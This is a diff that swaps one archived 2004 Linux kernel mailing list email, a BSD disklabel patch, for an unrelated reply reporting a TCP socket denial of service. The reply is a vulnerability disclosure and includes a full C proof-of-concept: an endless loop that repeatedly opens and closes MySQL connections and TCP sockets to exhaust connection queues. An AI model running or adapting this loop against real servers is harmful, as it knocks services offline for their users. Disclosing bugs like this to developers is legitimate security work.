@@ -1,64 +1,229 @@
-Return-Path: <linux-kernel-owner+willy=40w.ods.org-S268410AbUILCs2@vger.kernel.org>
+Return-Path: <linux-kernel-owner+willy=40w.ods.org-S268411AbUILCqs@vger.kernel.org>
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-	id S268410AbUILCs2 (ORCPT <rfc822;willy@w.ods.org>);
-	Sat, 11 Sep 2004 22:48:28 -0400
-Received: (majordomo@vger.kernel.org) by vger.kernel.org id S268420AbUILCs2
+	id S268411AbUILCqs (ORCPT <rfc822;willy@w.ods.org>);
+	Sat, 11 Sep 2004 22:46:48 -0400
+Received: (majordomo@vger.kernel.org) by vger.kernel.org id S268410AbUILCpt
 	(ORCPT <rfc822;linux-kernel-outgoing>);
-	Sat, 11 Sep 2004 22:48:28 -0400
-Received: from mail2.speakeasy.net ([216.254.0.202]:1488 "EHLO
-	mail2.speakeasy.net") by vger.kernel.org with ESMTP id S268410AbUILCsR
-	(ORCPT <rfc822;linux-kernel@vger.kernel.org>);
-	Sat, 11 Sep 2004 22:48:17 -0400
-Date: Sat, 11 Sep 2004 19:48:10 -0700
-Message-Id: <200409120248.i8C2mAeW025899@magilla.sf.frob.com>
-From: Roland McGrath <roland@frob.com>
-To: Linus Torvalds <torvalds@osdl.org>, Andrew Morton <akpm@osdl.org>
-Cc: Linux Kernel Mailing List <linux-kernel@vger.kernel.org>
-Subject: [PATCH] BSD disklabel: handle more than 8 partitions
-Emacs: because editing your files should be a traumatic experience.
+	Sat, 11 Sep 2004 22:45:49 -0400
+Received: from outbound04.telus.net ([199.185.220.223]:241 "EHLO
+	priv-edtnes28.telusplanet.net") by vger.kernel.org with ESMTP
+	id S268411AbUILCpk (ORCPT <rfc822;linux-kernel@vger.kernel.org>);
+	Sat, 11 Sep 2004 22:45:40 -0400
+From: "Wolfpaw - Dale Corse" <admin@wolfpaw.net>
+To: <davem@davemloft.net>
+Cc: <linux-kernel@vger.kernel.org>, <grsecurity@grsecurity.net>,
+       <bugtraq@securityfocus.com>
+Subject: RE: Linux 2.4.27 SECURITY BUG - TCP Local (probable Remote) Denial of Service
+Date: Sat, 11 Sep 2004 20:45:43 -0600
+Message-ID: <000001c49872$99333460$0200a8c0@wolf>
+MIME-Version: 1.0
+Content-Type: text/plain;
+	charset="us-ascii"
+Content-Transfer-Encoding: 7bit
+X-Priority: 3 (Normal)
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook, Build 10.0.6626
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1441
+Importance: Normal
+In-Reply-To: <022601c49866$9e8aa8f0$0300a8c0@s>
 Sender: linux-kernel-owner@vger.kernel.org
 X-Mailing-List: linux-kernel@vger.kernel.org
 
+Hi David,
 
-NetBSD allows 16 partitions, not just 8.  This patch both ups the number,
-and makes the recognition code tell you if the count in the disklabel
-exceeds the number supported by the kernel.
+Hmm.. I was more looking for the correct kernel developer to send
+it to, rather then just releasing exploit code into the wild, and
+having it end up a zero day hack. It was not in any way my intention
+to waste anyone's time. I will however, comply with your politely
+stated request :)
 
+As for it being an application bug - it may be one in Mysql not
+closing the sockets, but it is a Kernel Bug that allows CLOSE_WAIT
+sockets to clog up the connection queues, and cause a DOS conditions
+on other applications (such as Apache). Since most software used for
+denial of service is badly written (intentionally) to exploit the
+holes, the error should be fixed, not blamed on faulty software.
 
-Thanks,
-Roland
+That being said - below is a the proper description, and the code
+used to exploit it. Hope it helps. This version is not the one
+which invokes the CLOSE_WAIT state, but rather the TIME_WAIT one,
+I am not able to publish the source code for the CLOSE_WAIT bug.
+The log however clearly shows that a mysql descriptor is closed, 
+and then used immediately again by the socket call, which causes it 
+never to end up getting closed. Linux apparently has either no 
+timeout for CLOSE_WAIT, or it's a very very long one.. Either way 
+is a bad thing.
 
+D.
 
-Index: linux-2.6/include/linux/genhd.h
-===================================================================
-RCS file: /home/roland/redhat/bkcvs/linux-2.5/include/linux/genhd.h,v
-retrieving revision 1.51
-diff -b -p -u -r1.51 genhd.h
---- linux-2.6/include/linux/genhd.h 24 Aug 2004 18:28:31 -0000 1.51
-+++ linux-2.6/include/linux/genhd.h 12 Sep 2004 01:25:58 -0000
-@@ -249,7 +249,7 @@ struct solaris_x86_vtoc {
- /* check against BSD src/sys/sys/disklabel.h for consistency */
+Description
+=============
+The "socket" call will reuse file descriptor before it is completely
+finished closing. In this case, it is Mysql (3.23.58) which doesn't 
+appear to close them right away, and thus you end up with the
+result I mentioned.
+
+Proof Of Concept Code:
+======================
+#include <sys/types.h>
+#include <time.h>  
+#include <sys/stat.h>
+#include <ctype.h>
+#include <errno.h>
+#include <stdio.h> 
+#include <time.h>   
+#include <string>   
+#include <fcntl.h> 
+#include <signal.h> 
+#include <stdarg.h>   
+#include <sys/resource.h>
+#include <sys/wait.h>
+#include <stdlib.h>
+#include <sys/time.h> 
+#include <unistd.h> 
+#include <sys/socket.h> 
+#include <netinet/in.h> 
+#include <netinet/in_systm.h> 
+#include <netinet/ip.h> 
+#include <arpa/inet.h> 
+#include <arpa/telnet.h> 
+#include <netdb.h> 
+#include "mysql.h"
  
- #define BSD_DISKMAGIC	(0x82564557UL)	/* The disk magic number */
--#define BSD_MAXPARTITIONS	8
-+#define BSD_MAXPARTITIONS	16
- #define OPENBSD_MAXPARTITIONS	16
- #define BSD_FS_UNUSED		0	/* disklabel unused partition entry ID */
- struct bsd_disklabel {
-Index: linux-2.6/fs/partitions/msdos.c
-===================================================================
-RCS file: /home/roland/redhat/bkcvs/linux-2.5/fs/partitions/msdos.c,v
-retrieving revision 1.25
-diff -b -p -u -r1.25 msdos.c
---- linux-2.6/fs/partitions/msdos.c 24 Jun 2004 16:50:56 -0000 1.25
-+++ linux-2.6/fs/partitions/msdos.c 12 Sep 2004 01:34:35 -0000
-@@ -246,6 +246,9 @@ parse_bsd(struct parsed_partitions *stat
- 		put_partition(state, state->next++, bsd_start, bsd_size);
- 	}
- 	put_dev_sector(sect);
-+	if (le16_to_cpu(l->d_npartitions) > max_partitions)
-+		printk(" (ignored %d more)",
-+		       le16_to_cpu(l->d_npartitions) - max_partitions);
- 	printk(" >\n");
- }
- #endif
+int main (int argc, char **argv)
+{ 
+ 
+char *sql_host = "127.0.0.1";
+char *sql_name = "root";
+char *sql_pass = "<PASS>";
+char *sql_socket = NULL;
+int sql_port = <PORT>;
+char *c_host = "127.0.0.1";
+int c_port=80;
+long sock=0;
+int connectresult=0; 
+struct sockaddr_in sockaddr;
+MYSQL mysql; 
+MYSQL mysql2; 
+ 
+mysql_init(&mysql);
+mysql_init(&mysql2);
+ 
+if (!mysql_real_connect (&mysql2, sql_host, sql_name,
+sql_pass,NULL,sql_port,sql_socket,0))
+    {
+      printf ("SQL-ERROR connecting to database: %s",
+               mysql_error (&mysql));
+      exit(1);
+    } 
+ 
+printf("Mysql Socket Connected: %d\n",mysql.net.fd);
+ 
+while(1)
+{
+ 
+/* Close the SQL connection */
+mysql_close(&mysql);
+ 
+mysql_init(&mysql);
+if (!mysql_real_connect (&mysql, sql_host, sql_name,
+sql_pass,NULL,sql_port,sql_socket,0))
+    {
+      printf ("SQL-ERROR connecting to database: %s",
+               mysql_error (&mysql));
+      exit(1);
+    } 
+ 
+printf("Mysql Socket Connected: %d\n",mysql.net.fd);
+
+sockaddr.sin_addr.s_addr=inet_addr(c_host);
+sockaddr.sin_port=htons(c_port);
+ 
+  if((sock=socket(AF_INET, SOCK_STREAM, 0))<0)
+    printf("socket failed.");
+ 
+sockaddr.sin_family=AF_INET;
+ 
+printf("Connecting to %s:%d (FD: %ld)... ",c_host,c_port,sock);
+connectresult=connect(sock,(struct sockaddr *) &sockaddr, sizeof(sockaddr));
+ 
+if(connectresult) {
+   close(sock); 
+     
+     switch(errno) {
+       case ECONNREFUSED: 
+         printf(" CONNECTION REFUSED.\n");
+         break;
+       case ENETUNREACH:
+         printf(" HOST UNREACHABLE.\n");
+         break; 
+       default: 
+         printf(" FAILED: UNKNOWN ERROR");
+     } 
+}
+else
+{
+printf(" Connected.\n");
+}
+ 
+mysql_close(&mysql2);
+ 
+/* Make a Mysql Connection */
+mysql_init(&mysql2);
+if (!mysql_real_connect (&mysql2, sql_host, sql_name,
+sql_pass,NULL,sql_port,sql_socket,0))
+    {
+      printf ("SQL-ERROR connecting to database: %s",
+               mysql_error (&mysql2));
+      exit(1);
+    } 
+ 
+printf("Mysql Socket Connected: %d\n",mysql2.net.fd);
+ 
+/* Close the socket connection */
+printf("Closing socket #%ld",sock);
+close(sock);
+}
+ 
+}
+
+> -----Original Message-----
+> From: David S. Miller [mailto:davem@davemloft.net] 
+> Sent: Saturday, September 11, 2004 7:12 PM
+> To: admin@wolfpaw.net
+> Cc: linux-kernel@vger.kernel.org; grsecurity@grsecurity.net; 
+> bugtraq@securityfocus.com
+> Subject: Re: Linux 2.4.27 SECURITY BUG - TCP Local (probable 
+> Remote) Denial of Service
+> 
+> 
+> 
+> Close wait means the application locally has not closed
+> the file descriptor, yet the remote end has sent
+> a FIN.
+> 
+> This is %99 of the time an application bug.
+> 
+> But since you haven't provided much detail of the problem 
+> nobody will ever know exactly what you're talking about.
+> 
+> Please, do me and everyone else here on this list a real huge 
+> favor, don't post bug reports without all the details, you're 
+> just wasting everyone's time.  If it's exploitable, even more 
+> reason to post every single detail so we can work on a fix if 
+> necessary as fast as possible.
+> 
+> --------------------------------------------------------------
+> --------------
+> -
+> This message has been scanned for Spam and Viruses by ClamAV 
+> and SpamAssassin
+> --------------------------------------------------------------
+> --------------
+> -
+> 
+> 
+> 
+> 
+> 
+
